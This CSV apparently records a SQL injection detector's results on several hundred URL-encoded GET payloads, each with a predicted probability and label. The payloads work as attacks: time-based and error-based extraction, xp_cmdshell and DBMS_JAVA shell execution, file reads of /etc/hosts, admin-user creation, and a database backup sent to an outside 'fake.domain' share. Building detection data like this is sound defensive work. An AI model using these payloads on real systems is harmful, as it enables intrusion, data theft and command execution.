Method,length,content,URL,Predicted_Probability,Predicted_Label
GET,0,,/?p=%20AND%203516%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283516%3D3516%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29,0.9999999,1
GET,0,,/?p=%20AND%205650%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285650%3D5650%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29,1.0,1
GET,0,,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29,0.99999917,1
GET,0,,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29%23,1.0,1
GET,0,,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29--%20,1.0,1
GET,0,,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%29%29%23,0.9999999,1
GET,0,,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--%20,1.0,1
GET,0,,/?p=%%27%20AND%208310%3D8311%20AND%20%27%%27%3D%27,1.0,1
GET,0,,/?p=AND%20MAKE_SET%28YOLO%3Cascii%28substring%28concat%28login%2Cpassword%29%2CPOS%2C1%29%29%2C1%29,0.9999933,1
GET,0,,/?p=AND%20MAKE_SET%28YOLO%3Cascii%28substring%28version%28%29%2CPOS%2C1%29%29%2C1%29,0.9999999,1
GET,0,,/?p=AND%20MAKE_SET%28YOLO%3C%28SELECT%28length%28concat%28login%2Cpassword%29%29%29%29%2C1%29,0.9999677,1
GET,0,,/?p=AND%20MAKE_SET%28YOLO%3C%28SELECT%28length%28version%28%29%29%29%29%2C1%29,0.99999857,1
GET,0,,/?p=%27%20AND%20MID%28VERSION%28%29%2C1%2C1%29%20%3D%20%275%27%3B,1.0,1
GET,0,,/?p=%20AND%20%5BRANDNUM%5D%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27%5BRANDSTR%5D%27%2C%5BSLEEPTIME%5D%29,0.9999995,1
GET,0,,/?p=%20AND%20%5BRANDNUM%5D%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28%5BSLEEPTIME%5D00000000/2%29%29%29%29,1.0,1
GET,0,,/?p=AND%20%5BRANDNUM%5D%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C%5BSLEEPTIME%5D000000%29%29,0.9999988,1
GET,0,,/?p=AND%20%5BRANDNUM%5D%3D%28SELECT%20%5BRANDNUM%5D%20FROM%20PG_SLEEP%28%5BSLEEPTIME%5D%29%29,0.99995625,1
GET,0,,/?p=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29,1.0,1
GET,0,,/?p=%27%20and%20%28SELECT%20count%28%2A%29%20from%20sysibm.columns%20t1%2C%20sysibm.columns%20t2%2C%20sysibm.columns%20t3%29%3E0%20and%20%28select%20ascii%28substr%28user%2C1%2C1%29%29%20from%20sysibm.sysdummy1%29%3D68%20,0.9999845,1
GET,0,,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29bAKL%29%20AND%20%27vRxe%27%3D%27vRxe,1.0,1
GET,0,,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29,0.9999993,1
GET,0,,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29%23,1.0,1
GET,0,,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29--,1.0,1
GET,0,,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29YjoC%29%20AND%20%27%%27%3D%27,1.0,1
GET,0,,/?p=and%20%28SELECT%20hex%28substr%28tbl_name%2C1%2C1%29%29%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%%27%20limit%201%20offset%200%29%20%3E%20hex%28%27some_char%27%29,0.99999964,1
GET,0,,/?p=%20and%20%28select%20substring%28%40%40version%2C3%2C1%29%29%3D%27S%27,1.0,1
GET,0,,/?p=AnD%20SLEEP%285%29,0.9995453,1
GET,0,,/?p=AnD%20SLEEP%285%29%23,0.9999933,1
GET,0,,/?p=AnD%20SLEEP%285%29--,0.999984,1
GET,0,,/?p=%27%20AnD%20SLEEP%285%29%20ANd%20%271,1.0,1
GET,0,,/?p=%27%20and%20substr%28version%28%29%2C1%2C10%29%20%3D%20%27PostgreSQL%27%20and%20%271,1.0,1
GET,0,,/?p=%27%20and%20substr%28version%28%29%2C1%2C10%29%20%3D%20%27PostgreXXX%27%20and%20%271,1.0,1
GET,0,,/?p=%27%20and%20updatexml%28null%2Cconcat%280x0a%2C%28select%20table_name%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20LIMIT%200%2C1%29%29%2Cnull%29--%20-,1.0,1
GET,0,,/?p=%27%20and%20updatexml%28null%2Cconcat%280x0a%2Cversion%28%29%29%2Cnull%29--%20-,0.99999917,1
GET,0,,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Ccolumn_name%2CCHAR%28126%29%29%20FROM%20information_schema.columns%20WHERE%20TABLE_NAME%3Ddata_table%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,1.0,1
GET,0,,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cdata_info%2CCHAR%28126%29%29%20FROM%20data_table.data_column%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,1.0,1
GET,0,,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cschema_name%2CCHAR%28126%29%29%20FROM%20information_schema.schemata%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,1.0,1
GET,0,,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2CTABLE_NAME%2CCHAR%28126%29%29%20FROM%20information_schema.TABLES%20WHERE%20table_schema%3Ddata_column%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,1.0,1
GET,0,,/?p=AND%20updatexml%28rand%28%29%2Cconcat%28CHAR%28126%29%2Cversion%28%29%2CCHAR%28126%29%29%2Cnull%29-,0.9995491,1
GET,0,,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0,0.99999964,1
GET,0,,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0%23,1.0,1
GET,0,,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0--,1.0,1
GET,0,,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1,0.9999989,1
GET,0,,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1%23,1.0,1
GET,0,,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1--,1.0,1
GET,0,,/?p=BACKUP%20database%20master%20to%20disks%3D%27%5C%5Cfake.domain%5Cbackupdb.dat%27,1.0,1
GET,0,,/?p=benchmark%2810000000%2CMD5%281%29%29%23,0.99910223,1
GET,0,,/?p=%2Bbenchmark%283200%2CSHA1%281%29%29%2B%27,0.9999982,1
GET,0,,/?p=benchmark%2850000000%2CMD5%281%29%29,0.9586891,1
GET,0,,/?p=benchmark%2850000000%2CMD5%281%29%29%23,0.99915266,1
GET,0,,/?p=benchmark%2850000000%2CMD5%281%29%29--,0.9997563,1
GET,0,,/?p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Bcolumn_name%2BfRoM%2Binformation_schema.columns%2BwHerE%2Btable_name%3D%27data_table%27%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29--,0.99999535,1
GET,0,,/?p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Bdata_column%2BfRoM%2Bdata_table%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29,0.99972147,1
GET,0,,/?p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Btable_name%2BfRoM%2Binformation_schema.tables%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29--,0.9999882,1
GET,0,,/?p=%2CcAsT%28chr%28126%29%7C%7CvErSiOn%28%29%7C%7Cchr%28126%29%2BaS%2BnUmeRiC%29,0.9998435,1
GET,0,,/?p=%2Bconcat%280x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20%2Cversion%28%29%2C0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20%2C%28select%20count%28%2A%29%20from%20information_schema.schemata%29%2C0x3c2f666f6e743e3c2f666f6e743e%2C0x202d2d203a2d20%2Cconcat%28%40sc%3A%3D0x00%2C%40scc%3A%3D0x00%2C%40r%3A%3D0%2Cbenchmark%28%40a%3A%3D%28select%20count%28%2A%29%20from%20information_schema.schemata%29%2C%40scc%3A%3Dconcat%28%40scc%2C0x3c62723e3c62723e%2C0x3c666f6e7420636f6c6f723d7265643e%2CLPAD%28%40r%3A%3D%40r%2b1%2C3%2C0x30%29%2C0x2e20%2C%28Select%20concat%280x3c623e%2C%40sc%3A%3Dschema_name%2C0x3c2f623e%29%20from%20information_schema.schemata%20where%20schema_name%3E%40sc%20order%20by%20schema_name%20limit%201%29%2C0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20%2C%28select%20count%28%2A%29%20from%20information_Schema.tables%20where%20table_schema%3D%40sc%29%2C0x29%2C0x3c2f666f6e743e%2C0x202e2e2e20%20%2C%40t%3A%3D0x00%2C%40tt%3A%3D0x00%2C%40tr%3A%3D0%2Cbenchmark%28%28select%20count%28%2A%29%20from%20information_Schema.tables%20where%20table_schema%3D%40sc%29%2C%40tt%3A%3Dconcat%28%40tt%2C0x3c62723e%2C0x3c666f6e7420636f6c6f723d677265656e3e%2CLPAD%28%40tr%3A%3D%40tr%2b1%2C3%2C0x30%29%2C0x2e20%2C%28select%20concat%280x3c623e%2C%40t%3A%3Dtable_name%2C0x3c2f623e%29%20from%20information_Schema.tables%20where%20table_schema%3D%40sc%20and%20table_name%3E%40t%20order%20by%20table_name%20limit%201%29%2C0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20%2C%28select%20count%28%2A%29%20from%20information_Schema.columns%20where%20table_name%3D%40t%29%2C0x29%2C0x3c2f666f6e743e%2C0x202d2d3a20%2C%40c%3A%3D0x00%2C%40cc%3A%3D0x00%2C%40cr%3A%3D0%2Cbenchmark%28%28Select%20count%28%2A%29%20from%20information_schema.columns%20where%20table_schema%3D%40sc%20and%20table_name%3D%40t%29%2C%40cc%3A%3Dconcat%28%40cc%2C0x3c62723e%2C0x3c666f6e7420636f6c6f723d707572706c653e%2CLPAD%28%40cr%3A%3D%40cr%2b1%2C3%2C0x30%29%2C0x2e20%2C%28Select%20%28%40c%3A%3Dcolumn_name%29%20from%20information_schema.columns%20where%20table_schema%3D%40sc%20and%20table_name%3D%40t%20and%20column_name%3E%40c%20order%20by%20column_name%20LIMIT%201%29%2C0x3c2f666f6e743e%29%29%2C%40cc%2C0x3c62723e%29%29%2C%40tt%29%29%2C%40scc%29%2C0x3c62723e3c62723e%2C0x3c62723e3c62723e%29%2B,0.99999976,1
GET,0,,/?p=%2Bconcat/%2A%21%28unhex%28hex%28concat/%2A%21%280x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e%2C0x223e%2C0x273e%2C0x3c62723e3c62723e%2Cunhex%28hex%28concat/%2A%21%280x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e%29%29%29%2C0x3c62723e3c62723e%2C0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20%2Cversion%28%29%2C0x7e20%2C%40%40version_comment%2C0x3c62723e5072696d617279204461746162617365203a3a20%2C%40d%3A%3Ddatabase%28%29%2C0x3c62723e44617461626173652055736572203a3a20%2Cuser%28%29%2C%28/%2A%2112345selEcT%2A/%28%40x%29/%2A%21from%2A/%28/%2A%2112345selEcT%2A/%28%40x%3A%3D0x00%29%2C%28%40r%3A%3D0%29%2C%28%40running_number%3A%3D0%29%2C%28%40tbl%3A%3D0x00%29%2C%28/%2A%2112345selEcT%2A/%280%29%20from%28information_schema./%2A%2A/columns%29where%28table_schema%3Ddatabase%28%29%29%20and%280x00%29in%28%40x%3A%3DConcat/%2A%21%28%40x%2C%200x3c62723e%2C%20if%28%20%28%40tbl%21%3Dtable_name%29%2C%20Concat/%2A%21%280x3c666f6e7420636f6c6f723d707572706c652073697a653d333e%2C0x3c62723e%2C0x3c666f6e7420636f6c6f723d626c61636b3e%2CLPAD%28%40r%3A%3D%40r%2b1%2C%202%2C%200x30%29%2C0x2e203c2f666f6e743e%2C%40tbl%3A%3Dtable_name%2C0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28%2Cdatabase%28%29%2C0x293c2f666f6e743e3c2f666f6e743e%2C0x3c2f666f6e743e%2C0x3c62723e%29%2C%200x00%29%2C0x3c666f6e7420636f6c6f723d626c61636b3e%2CLPAD%28%40running_number%3A%3D%40running_number%2b1%2C3%2C0x30%29%2C0x2e20%2C0x3c2f666f6e743e%2C0x3c666f6e7420636f6c6f723d7265643e%2Ccolumn_name%2C0x3c2f666f6e743e%29%29%29%29x%29%29%29%29%29%2A/%2B,1.0,1
GET,0,,/?p=create%20table%20myfile%20%28input%20TEXT%29%3B%20load%20data%20infile%20%27/etc/hosts%27%20into%20table%20myfile%3B%20select%20%2A%20from%20myfile%3B,0.9999652,1
GET,0,,/?p=create%20table%20myfile%20%28line%20varchar%288000%29%29%22%20bulk%20insert%20foo%20from%20%27c%3A%5Cinetpub%5Cwwwroot%5Cauth.asp%27%22%20select%20%2A%20from%20myfile%22--,1.0,1
GET,0,,/?p=declare%20%40q%20nvarchar%20%28200%29%200x730065006c00650063007400200040004000760065007200730069006f006e00%20exec%28%40q%29,0.9998011,1
GET,0,,/?p=declare%20%40s%20varchar%20%28200%29%20select%20%40s%20%3D%200x73656c65637420404076657273696f6e%20exec%28%40s%29,0.99713707,1
GET,0,,/?p=exec%20master..xp_cmdshell%20%27ipconfig%2B/all%27%20%20%20%20,1.0,1
GET,0,,/?p=exec%20master..xp_cmdshell%20%27net%2Busers%27,0.99975544,1
GET,0,,/?p=exec%20master..xp_cmdshell%20%27net%2Bview%27,0.999881,1
GET,0,,/?p=%27%3B%20exec%20master..xp_cmdshell%20%27ping%20127.0.0.1%27--,1.0,1
GET,0,,/?p=exec%20master..xp_cmdshell%20%27ping%2B127.0.0.1%27,0.9999987,1
GET,0,,/?p=%27%20grant%20connect%20to%20name%3B%20grant%20resource%20to%20name%3B%20--,1.0,1
GET,0,,/?p=%27%20GROUP%20BY%20columnnames%20having%201%3D1%20--,0.9999999,1
GET,0,,/?p=%27%20GROUP%20BY%20column_name%20UNION%20ALL%20SELECT%20column_name%2C1%2C1%20FROM%20%20%28select%20column_name%20AS%20new_name%20from%20%60project_id.dataset_name.table_name%60%29%20AS%20A%20GROUP%20BY%20column_name%23,1.0,1
GET,0,,/?p=%20HAVING%201%3D0,0.99705255,1
GET,0,,/?p=%20HAVING%201%3D0%23,0.99985504,1
GET,0,,/?p=%20HAVING%201%3D0--%20,0.9999999,1
GET,0,,/?p=%20HAVING%201%3D1,0.9859367,1
GET,0,,/?p=%20HAVING%201%3D1%23,0.9992086,1
GET,0,,/?p=%20HAVING%201%3D1--%20,0.9999987,1
GET,0,,/?p=%20IF%287423%3D7423%29%20SELECT%207423%20ELSE%20DROP%20FUNCTION%20xcjl--,0.99999976,1
GET,0,,/?p=injection%27%3Bcreate%20table%20NotSoSecure%20%28data%20varchar%28200%29%29%3B--,1.0,1
GET,0,,/?p=%2Bmake_set%286%2C%40%3A%3D0x0a%2C%28select%281%29from%28information_schema.columns%29where%40%3A%3Dmake_set%28511%2C%40%2C0x3c6c693e%2Ctable_name%2Ccolumn_name%29%29%2C%40%29,0.99980444,1
GET,0,,/?p=make_set%286%2C%40%3A%3D0x0a%2C%28select%281%29from%28information_schema.columns%29where%40%3A%3Dmake_set%28511%2C%40%2C0x3c6c693e%2Ctable_name%2Ccolumn_name%29%29%2C%40%29,0.9994067,1
GET,0,,/?p=%27%20%7C%7C%20myappadmin.adduser%28%27admin%27%2C%20%27newpass%27%29%20%7C%7C%20%27,0.9999982,1
GET,0,,/?p=%20OR%201%3D0,0.975155,1
GET,0,,/?p=%20OR%201%3D0%23,0.9993742,1
GET,0,,/?p=%20OR%201%3D0--%20,0.99999905,1
GET,0,,/?p=%20OR%201%3D1%23,0.9951185,1
GET,0,,/?p=%20OR%201%3D1--%20,0.99998844,1
GET,0,,/?p=%27or%20123.22%3D123.22,0.99999964,1
GET,0,,/?p=OR%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000/2%29%29%29%29,1.0,1
GET,0,,/?p=%20OR%203409%3D3409%20AND%20%28%27pytW%27%20LIKE%20%27pytW,1.0,1
GET,0,,/?p=%22%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.99999964,1
GET,0,,/?p=%22%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.9999963,1
GET,0,,/?p=%22%29%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.9999958,1
GET,0,,/?p=%27%20or%20benchmark%2810000000%2CMD5%281%29%29%23,1.0,1
GET,0,,/?p=%27%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.99999976,1
GET,0,,/?p=%27%29%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,0.9999989,1
GET,0,,/?p=or%20benchmark%2850000000%2CMD5%281%29%29,0.9988663,1
GET,0,,/?p=or%20benchmark%2850000000%2CMD5%281%29%29%23,0.999961,1
GET,0,,/?p=or%20benchmark%2850000000%2CMD5%281%29%29--,0.9999908,1
GET,0,,/?p=%20ORDER%20BY%201%20,0.99867,1
GET,0,,/?p=%20ORDER%20BY%201%23%20,0.99994767,1
GET,0,,/?p=%20ORDER%20BY%201--%20,0.99998736,1
GET,0,,/?p=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%23,0.9999999,1
GET,0,,/?p=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20,0.99999714,1
GET,0,,/?p=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21--,0.9999999,1
GET,0,,/?p=ORDER%20BY%20SLEEP%285%29,0.9729803,1
GET,0,,/?p=ORDER%20BY%20SLEEP%285%29%23,0.9992112,1
GET,0,,/?p=ORDER%20BY%20SLEEP%285%29--,0.9985916,1
GET,0,,/?p=%27%20or%20%28EXISTS%29,0.99914396,1
GET,0,,/?p=%27%20OR%20if%281/%28length%28%28select%28%27a%27%29%29%29-1%29%3D1%2Ctrue%2Cfalse%29%20OR%20%27,1.0,1
GET,0,,/?p=%20or%20isNULL%281/0%29%20/%2A,0.9999995,1
GET,0,,/?p=%22%20or%20isNULL%281/0%29%20/%2A,1.0,1
GET,0,,/?p=%22%20or%20pg_sleep%285%29--,0.9995223,1
GET,0,,/?p=%22%29%20or%20pg_sleep%285%29--,0.98134226,1
GET,0,,/?p=%22%29%29%20or%20pg_sleep%285%29--,0.99490535,1
GET,0,,/?p=%27%20or%20pg_sleep%285%29--,0.9999387,1
GET,0,,/?p=%27%29%20or%20pg_sleep%285%29--,0.9996984,1
GET,0,,/?p=%27%29%29%20or%20pg_sleep%285%29--,0.99901927,1
GET,0,,/?p=or%20pg_SLEEP%285%29,0.9877325,1
GET,0,,/?p=or%20pg_SLEEP%285%29%23,0.999521,1
GET,0,,/?p=or%20pg_SLEEP%285%29--,0.99947494,1
GET,0,,/?p=%27%20OR%20%28SELECT%20%28CASE%20WHEN%20EXISTS%28SELECT%20name%20FROM%20items%20WHERE%20name%20REGEXP%20%22%5Ea.%2A%22%29%20THEN%20SLEEP%283%29%20ELSE%201%20END%29%29%3B%20--%20-,1.0,1
GET,0,,/?p=%22%20or%20sleep%285%29%23,0.9997274,1
GET,0,,/?p=%22%20or%20sleep%285%29%3D%22,0.9993241,1
GET,0,,/?p=%22%29%20or%20sleep%285%29%3D%22,0.9990716,1
GET,0,,/?p=%22%29%29%20or%20sleep%285%29%3D%22,0.9997844,1
GET,0,,/?p=%27%20or%20sleep%285%29%23,0.9999534,1
GET,0,,/?p=%27%20or%20sleep%285%29%3D%27,0.99999905,1
GET,0,,/?p=%27%29%20or%20sleep%285%29%3D%27,1.0,1
GET,0,,/?p=%27%29%29%20or%20sleep%285%29%3D%27,0.99999976,1
GET,0,,/?p=or%20SLEEP%285%29,0.9814647,1
GET,0,,/?p=or%20SLEEP%285%29%23,0.9993449,1
GET,0,,/?p=or%20SLEEP%285%29--,0.99889153,1
GET,0,,/?p=or%20SLEEP%285%29%3D%22,0.9999924,1
GET,0,,/?p=or%20SLEEP%285%29%3D%27,1.0,1
GET,0,,/?p=%22%20or%20true--,0.99997926,1
GET,0,,/?p=%22%29%20or%20true--,0.9999591,1
GET,0,,/?p=%27%20or%20true--,0.9999995,1
GET,0,,/?p=%27%29%20or%20true--,0.99999785,1
GET,0,,/?p=or%20true--,0.999073,1
GET,0,,/?p=%27%20or%20uid%20like%20%27%,0.99999964,1
GET,0,,/?p=%27%20or%20uname%20like%20%27%,1.0,1
GET,0,,/?p=%20or%20%27unusual%27%20%3D%20%27unusual%27,0.9999558,1
GET,0,,/?p=%27%20or%20%27unusual%27%20%3D%20%27unusual%27,0.9999989,1
GET,0,,/?p=%20OR%20x%3Dx,0.86632895,1
GET,0,,/?p=%20OR%20x%3Dx%23,0.9807587,1
GET,0,,/?p=%20OR%20x%3Dx--%20,0.99985576,1
GET,0,,/?p=%20OR%20x%3Dy,0.7955664,1
GET,0,,/?p=%20OR%20x%3Dy%23,0.9802654,1
GET,0,,/?p=%20OR%20x%3Dy--%20,0.9999181,1
GET,0,,/?p=pg_sleep%285%29--,0.8646879,1
GET,0,,/?p=pg_SLEEP%285%29,0.9425488,1
GET,0,,/?p=pg_SLEEP%285%29%23,0.9969091,1
GET,0,,/?p=pg_SLEEP%285%29--,0.99755764,1
GET,0,,/?p=RANDOMBLOB%281000000000/2%29,0.9840221,1
GET,0,,/?p=%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%284346%3D4346%29%20THEN%200x61646d696e%20ELSE%200x28%20END%29%29%20AND%20%27Txws%27%3D%27,1.0,1
GET,0,,/?p=%27%2B%28select%201%20and%20row%281%2C1%29%3E%28select%20count%28%2A%29%2Cconcat%28CONCAT%28%40%40VERSION%29%2C0x3a%2Cfloor%28rand%28%29%2A2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29%2B%27,1.0,1
GET,0,,/?p=%28select%201%20and%20row%281%2C1%29%3E%28select%20count%28%2A%29%2Cconcat%28CONCAT%28%40%40VERSION%29%2C0x3a%2Cfloor%28rand%28%29%2A2%29%29x%20from%20%28select%201%20union%20select%202%29a%20group%20by%20x%20limit%201%29%29,0.99999845,1
GET,0,,/?p=%28select%28%40a%29from%28select%28%40a%3A%3D0x00%29%2C%28select%28%40a%29from%28information_schema.columns%29where%28table_schema%21%3D0x696e666f726d6174696f6e5f736368656d61%29and%28%40a%29in%28%40a%3A%3Dconcat%28%40a%2Ctable_name%2C0x203a3a20%2Ccolumn_name%2C0x3c62723e%29%29%29%29a%29,0.99999654,1
GET,0,,/?p=select%20case%20when%20substring%28column%2C1%2C1%29%3D%271%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20column_name%20limit%201,0.9967018,1
GET,0,,/?p=select%20case%20when%20substring%28column%2C1%2C1%29%3D%271%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20column_name%20where%20column_name%3D%27value%27%20limit%201,0.99774146,1
GET,0,,/?p=select%20case%20when%20substring%28datname%2C1%2C1%29%3D%271%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20pg_database%20limit%201,0.99656975,1
GET,0,,/?p=select%20case%20when%20substring%28table_name%2C1%2C1%29%3D%27a%27%20then%20pg_sleep%285%29%20else%20pg_sleep%280%29%20end%20from%20information_schema.tables%20limit%201,0.9997429,1
GET,0,,/?p=select%20current_database%28%29%3B,0.7419289,1
GET,0,,/?p=select%20current%20server%20from%20sysibm.sysdummy1%3B,0.8576013,1
GET,0,,/?p=select%20current_setting%28%27config_file%27%29%3B,0.8627502,1
GET,0,,/?p=select%20current_setting%28%27data_directory%27%29%3B,0.72335356,1
GET,0,,/?p=select%20current_setting%28%27hba_file%27%29%3B,0.9542973,1
GET,0,,/?p=select%20current_setting%28%27krb_server_keyfile%27%29%3B,0.6920146,1
GET,0,,/?p=select%20current_setting%28%27log_connections%27%29%3B,0.785062,1
GET,0,,/?p=select%20current_setting%28%27log_statement%27%29%3B,0.5280345,1
GET,0,,/?p=select%20current_setting%28%27password_encryption%27%29%3B,0.3831384,0
GET,0,,/?p=select%20current_setting%28%27port%27%29%3B,0.3588326,0
GET,0,,/?p=select%20current_setting%28%27virtual_host%27%29%3B,0.4568653,0
GET,0,,/?p=select%20current_user%3B,0.12743913,0
GET,0,,/?p=SELECT%20DBMS_JAVA.RUNJAVA%28%27oracle/aurora/util/Wrapper%20/bin/bash%20-c%20/bin/ls%3E/tmp/OUT.LST%27%29%20FROM%20DUAL,1.0,1
